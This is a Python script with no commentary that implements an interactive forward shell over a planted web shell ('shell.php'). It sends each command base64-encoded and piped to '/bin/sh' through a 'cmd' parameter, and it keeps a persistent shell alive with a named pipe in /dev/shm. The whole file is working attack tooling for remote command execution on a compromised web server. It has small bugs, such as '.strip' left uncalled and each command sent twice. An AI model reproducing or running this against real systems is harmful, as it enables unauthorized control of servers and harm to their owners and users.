#!/usr/bin/python3

import requests, sys, signal, time
from base64 import b64encode
from random import randrange

# Global variables
global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % session
stdout = "/dev/shm/output.%s" % session

def sigHandler(sig, frame):
    print ("\n\n [!] Exiting...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, sigHandler)

def runCmd(cmd):
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')

    payload = {
        'cmd' : 'echo "%s" | base64 -d | /bin/sh' % (cmd)
    }
    result = requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text
    return result

def writeCmd(cmd):

    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')

    payload = {
        'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
    }

    result = (requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text).strip
    return result

def readCmd():
    getOutput = """/bin/cat %s""" % (stdout)
    output = runCmd(getOutput)
    return output


def setupShell():
    namedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)

    try:
        runCmd(namedPipes)
    except:
        None
    return None

setupShell()

while True:
    cmd = input("$~ ")
    response = runCmd(cmd)
    writeCmd(cmd + "\n")
    outputContent = readCmd()
    print(outputContent)
    runCmd("echo '' > %s" % stdout)
